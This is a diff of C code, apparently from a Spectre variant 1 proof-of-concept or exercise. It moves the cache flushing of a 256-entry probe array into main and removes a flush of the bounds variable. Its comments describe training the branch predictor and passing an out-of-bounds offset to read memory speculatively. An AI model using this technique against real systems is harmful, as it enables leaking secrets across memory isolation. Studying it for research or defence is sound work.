@@ -77,16 +77,7 @@ inline void flush(const char *adrs)
 }
 volatile int  __attribute__((optimize("O0")))speculativeexec(volatile size_t a){
 
-    // we need to flush size_array so that the BPU predicts and executes speculatively
-    flush((const char *)&size_array);
-
-    /*
-        Now we flush probe 
-        probe + 4096 * k , all the 256 byte lie on different pages in order to beat the prefetcher 
-    */
-    for (volatile int k = 0; k < 256; ++k) flush((const char*)probe + 4096 * k) ;
-
-    if (a < size_array){
+        if (a < size_array){
         /*
                 Do speculative exec here
         */
@@ -130,7 +121,13 @@ int __attribute__((optimize("O0")))  main(int argc, char const *argv[])
 				
                 // pass values to fn  speculativeexec() here to train the BPU into taking if
 		
-	}
+    }
+
+    /*
+        Now we flush probe 
+        probe + 4096 * k , all the 256 byte lie on different pages in order to beat the prefetcher 
+    */
+    for (volatile int k = 0; k < 256; ++k) flush((const char*)probe + 4096 * k) ;
 
     /*
         Now we pass the offset to the speculativeexec() so that the BPU thinks the if evaluates to true
